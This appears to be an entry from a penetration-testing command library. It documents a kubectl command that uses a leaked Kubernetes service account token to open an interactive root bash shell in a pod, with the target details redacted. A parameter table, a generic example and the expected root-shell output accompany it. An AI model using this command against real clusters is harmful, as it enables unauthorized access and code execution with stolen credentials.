---
data: >-
  kubectl --certificate-authority ca.crt --server https://████ --token
  "█████.██████.███" exec -it w█████████ -- /bin/bash
tags:
  - kubernetes
  - rce
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 8000f54e-7450-4cf6-9a4a-1324070079ec
created_at: '2025-12-11T06:10:23.206Z'
updated_at: '2025-12-11T06:10:23.206Z'
verified: false
validated: true
submitted: true
---
# kubectl-exec-pod-with-token

## Command

```bash
kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash
```

## Description

Executes bash in a pod using a leaked service account token for authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--certificate-authority` | CA certificate file | Yes |
| `--server` | Kubernetes server URL | Yes |
| `--token` | Service account token | Yes |
| `exec -it w█████████ -- /bin/bash` | Interactive exec in pod | Yes |

## Examples

### Basic Usage

```bash
kubectl --certificate-authority ca.crt --server https://k8s-server --token token-value exec -it my-pod -- /bin/bash
```

## Expected Output

Root shell prompt, id showing uid=0(root).

## Related

- [[commands/kubectl-exec-pod-with-token-namespace]]
- [[procedures/Gain-Root-Shell-in-Kubernetes-Containers-Using-Service-Account-Token]]
